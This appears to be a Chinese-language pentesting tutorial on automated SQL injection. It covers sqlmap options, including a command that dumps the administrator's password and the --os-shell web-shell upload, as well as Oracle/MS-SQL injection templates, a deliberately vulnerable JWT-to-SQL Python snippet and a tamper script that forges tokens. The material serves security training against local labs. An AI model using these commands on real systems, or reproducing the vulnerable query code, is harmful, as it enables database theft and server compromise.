## 自动检测 SQL 注入

我们介绍的许多利用SQL注入漏洞的攻击技巧都需要提交大量请求，以逐次提取少量的数据。幸运的是，我们可以使用各种工具来自动完成上述过程

当前，多数工具通过以下方法来利用SQL注入漏洞。

- 对目标请求中的所有参数实施蛮力攻击，以查找SQL注入点。

- 通过附加各种字符，如闭括号、注释字符和SQL关键字，确定后端SQL查询中易受攻击的字段的位置。

- 通过蛮力猜测请求的列数，然后确定包含varchar数据类型的列（可用于返回结果），尝试实施UNION攻击。

- 注入定制查询来检索任意数据——如果需要，将多个列中的数据串连成一个字符串，以便于从单独一个varchar数据类型的结果中进行检索。

- 如果无法使用UNION检索结果，可以在查询中注入布尔型条件（AND 1=1、AND 1=2等），以确定是否可以使用条件响应来检索数据。

- 如果无法通过注入条件表达式来检索结果，可以尝试使用条件时间延迟来检索数据。

这些工具通过在目标数据库中查询相关元数据表来查找数据。通常，它们能够执行一定程度的权限提升，如使用 `xp_cmdshell` 获得操作系统级访问权限。它们还使用各种优化技巧，并利用各种数据库中的诸多功能和内置函数，以减少基于推测的蛮力攻击所需提交的查询数，避开可能对单引号实施的过滤，等等。

这些工具是主要的注入工具，最适于通过利用已确定并熟悉的注入点，从数据库中提取数据。在通过这些工具注入数据之前或之后，通常需要提供其他一些SQL 语法，以确保这些工具的硬编码攻击生效。

### 自动工具渗透测试步骤

确定某个 SQL 注入漏洞后，可以考虑使用 SQL 注入工具来利用该漏洞，并从数据库中检索有用的数据。在需要使用盲目技巧每次检索少量数据时，这种做法尤其有效。

1. 使用拦截代理服务器运行 SQL 注入工具，分析该工具提交的请求以及应用程序的响应。打开工具上的任何详细输出选项，并将它的进度与观察到的查询和响应关联起来。

2. 由于这些工具通常依赖预先设置的测试和特定的响应语法，因此，攻击者可能需要将数据附加或前置到这些工具注入的字符串中，以确保获得预期的响应。典型的要求包括添加注释字符、平衡服务器的 SQL 查询中的单引号，以及将闭括号前置或附加到字符串以与原始查询匹配。

3. 如果尽管采用了上述方法，但查询语法仍然无效，这时，最简单的方法是创建完全受控制的嵌套查询，并使用注入工具注入该子查询。这样，注入工具就可以通过推断来提取数据。在注入标准的 SELECT 和 UPDATE 查询时，嵌套查询非常有用。在 Oracle 中，嵌套查询位于 INSERT 语句中。下面的示例前置 `[input]` 之前的文本，并附加该位置之后的闭括号：

    - Oracle：`'||(select 1 from dual where 1=[input])`
    - MS-SQL：`(select 1 where 1=[input])`

### SQLMap

文档 https://github.com/sqlmapproject/sqlmap/wiki/Usage

SQLMap 是一个自动数据库接管工具，拥有庞大的社区支持。SQLMap 包含多种 payload，可用于确认 SQL 注入的存在。以下命令将自动检测 `id` 参数的存在并测试漏洞。

**命令**
```bash
sqlmap -u http://127.0.0.1/sqlilabs/Less-2/?id=1 --dbs
```

可以将 sqlmap 作为独立工具使用，或将其与你正在使用的测试代理集成。例如，你可以通过安装 SQLiPy Burp 插件将 sqlmap 集成到 Burp 中。

利用该工具的最佳方法之一，是使用 `--sql-shell` 选项。这样，攻击者将能够在SQL提示符下于后台执行必要的 UNION、基于错误或盲目的 SQL 注入，以发送和检索结果。

> 测试等级设置涵盖的注入点位置，指定参数设置在测试的注入点中寻找的参数值。例如，目标注入点为 Cookie 字段，而注入等级为不含 Cookie 字段的 level=1，那么测试仅在 level=1 的查询参数与请求体中寻找目标字段。而 Cookie 字段的同名参数不会被测试。于是，每次按照注入点调整测试等级，或固定设置最高测试等级以确保涵盖。

示例：

```sh
sqlmap -r req.txt \
    --force-ssl \
    --level=5 \
    --risk=2 \
    --threads=10 \
    --technique=B \
    -p "TrackingId" \
    --prefix "'" \
    --suffix "--" \
    --string="Welcome back" \
    --dump -C "password" -T "users" --where "username = 'administrator'" -D "public" \
    --charset="abcdefghijklmnopqrstuvwxyz0123456789" \
    --flush-session -v 3
```

> 设置详细的前后缀反而可能效果不佳。若遇到异常，尝试简化前后缀，切换或移除触点条件。遇到了无法使用 SQLMap 爆破密码的条件错误盲 SQLi 示例 lab（而只需设置 burp 的集束炸弹模式爆破）。SQLMap 仅可对部分内容进行设置的固定载荷构造体现出自动化工具的局限。仍需主要继续使用通用的 Burp/Zap 或构造脚本，SQLMap 这类工具仅稍作设置后尝试注入

#### 参数

- `-v` 
    详细程度

##### Target

- `-r 文件路径`
    从文件加载 HTTP 请求

    > 若使用 HTTPS 连接端点，需结合使用 `--force-ssl` 命令行参数强制使用 443/tcp 端口进行 SSL 连接。或者，在文件的 Host 标头值的末尾添加 `:443` 

##### General

- `--charset="自定义字符集"`
    自定义盲注字符集

- `--dump`
    转储数据库条目

    - `-D 数据库` 数据库
        - 若省略数据库，将使用并自动测试当前数据库名
    - `-T 表` 表
    - `-C 列` 列
    - `--where="条件"` 即 `WHERE`

- `--test-filter=关键字`
    指定测试使用的关键字

- `--flush-session`
    刷新缓存，或手动删除缓存文件

##### Detection

- `--level=LEVEL`
    此参数设置检测等级，可以是 1 到 5 之间的任何值。在等级 1，SQLMap 执行有限的测试子集。另一方面，等级 5 表示全面的测试方法，使用更多种类的 payload 并测试边界。这包括探测头部、cookie 和其他潜在注入点中的漏洞。虽然等级 5 增加了测试覆盖率和检测概率，但它也会产生更多噪音，从而更易被检测到。

- `--risk=RISK`
    此选项允许你指定 SQL 注入测试的风险等级，范围从 1 到 3。默认等级为 1。将等级提高到 2 或 3 会加强测试过程，采用更适合复杂场景的高级注入技术。

- 页面比较，可使用十六进制表示特殊字符
    - `--string`
        指定命中字符串
    - `--regexp`
        指定命中正则表达式
    - `--code`
        指定命中响应码
    - `--not-string`
        指定丢失字符串


##### Injection

- `-p "参数a,参数b"`
    指定测试参数
    > 文档对指定测试参数后无需设置测试等级的描述错误，仍需设置测试等级

- `*` 或 `%INJECT HERE%`
    设置任意注入点

- `--dbms 数据库`
    设置目标数据库类型

- `--prefix="前缀"` 与 `--suffix="后缀"`
    自定义注入载荷的前后缀

##### Techniques

- `--technique=代表字母的组合`
    指定注入类型
    - `B` 布尔
    - `E` 错误
    - `U` 联合
    - `T` 时间
    - `S` 堆叠
    - `Q` 内联

- `--time-sec`
    设置基于时间的盲注使用的延迟时长

- 二阶注入
    - `--second-url` 与 `--second-req`

#####  Operating system access

- `--os-shell`
    尝试在常见的 Web 服务器目录中上传 Web shell

#### 基于 JWT 的 SQL 注入

JWT 令牌用于各种目的，例如身份验证、授权和双方之间的安全信息传输。

现在，考虑一个场景，其中 JWT 令牌未经任何验证或清理而直接插入到 SQL 查询中。让我们检查易受攻击的代码：

**易受攻击的代码**
```python
jwt_token = request.args.get('q')
decoded = jwt.decode(jwt_token, 'secret@123', algorithms=['HS256'])
name = decoded.get('name', '')
last_name = decoded.get('last_name', '')
user_id = decoded.get('id', '')
connection = db_connect()
try:
    with connection.cursor() as cursor:
        query = f"SELECT * FROM users WHERE user_agent = '{name}'"
        cursor.execute(query)
        result = cursor.fetchall()
        if result:
            return f"Welcome, {name}!<br>"
        else:
            return "User not found!"
```

在此代码中，输入使用用户可控的参数 `q` 提供。以下部分处理它：

**代码**

#### 使用 Tamper 脚本自动化

为每个 payload 手动生成 JWT 令牌的过程可能很繁琐，尤其是在注入复杂的情况下。在这种情况下，我们可以创建一个自定义 tamper 脚本来自动化工作流，并将其与 SQLMap 一起使用以自动化数据库提取过程。

SQLMap 支持创建自定义 tamper 脚本以支持此类场景。这些 tamper 脚本使用 Python 编写，与该工具所使用的语言相同。

以下 tamper 脚本使用 `name` 参数作为注入，并传递 `payload`。`payload` 变量包含 SQLMap 生成的 payload。然后它使用密钥生成 JWT 令牌。

**代码：Tamper 脚本**
```python
import jwt
from datetime import datetime, timedelta
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    # Your secret key
    secret_key = 'secret@123'
    # Payload for the JWT token
    token = {
        'name': "Tmgm " + payload,
        'last_name': 'test',
        'id': '123',
        'exp': datetime.utcnow() + timedelta(hours=1)  # Optional: Set an expiration time
    }
    # Generate the JWT token
    jwt_token = jwt.encode(token, secret_key, algorithm='HS256')
    return jwt_token
```

创建 tamper 脚本后，我们可以使用 `--tamper` 标志来使用该脚本：

**示例**
```bash
sqlmap -u "http://127.0.0.1:5000/lab2?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJsYXN0X25hbWUiOiJ0bWdtIiwiaWQiOiIxMjMiLCJleHAiOjE3MDM5NzgxMTF9.cLlZkjhrMLUUaGkA8iHjOf8PnVqBklEEU1KnT8oj59M" --tamper mytamper
```
